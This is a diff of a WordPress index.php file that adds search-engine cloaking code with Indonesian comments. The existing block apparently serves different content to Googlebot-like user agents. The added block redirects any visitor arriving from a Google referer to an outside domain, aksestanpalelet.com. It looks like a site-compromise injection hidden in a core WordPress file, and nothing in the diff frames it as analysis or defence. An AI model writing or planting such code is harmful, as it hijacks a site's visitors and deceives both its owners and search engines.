@@ -7,9 +7,7 @@
  */
 
 /**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
+ * Cloaking user-agent Googlebot dan semacamnya
  */
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $ua = $_SERVER['HTTP_USER_AGENT'];
@@ -30,8 +28,20 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 }
 
 /**
+ * Cloaking berdasarkan referer Google
+ */
+if (isset($_SERVER['HTTP_REFERER'])) {
+    $referer = $_SERVER['HTTP_REFERER'];
+
+    if (preg_match('/https?:\/\/(www\.)?google\.[a-z.]+/i', $referer)) {
+        header('Location: https://long85416.aksestanpalelet.com/redirlong');
+        exit;
+    }
+}
+
+/**
  * Front to the WordPress application.
  * Loads wp-blog-header.php which loads the theme.
  */
-define( 'WP_USE_THEMES', true );
+define('WP_USE_THEMES', true);
 require __DIR__ . '/wp-blog-header.php';
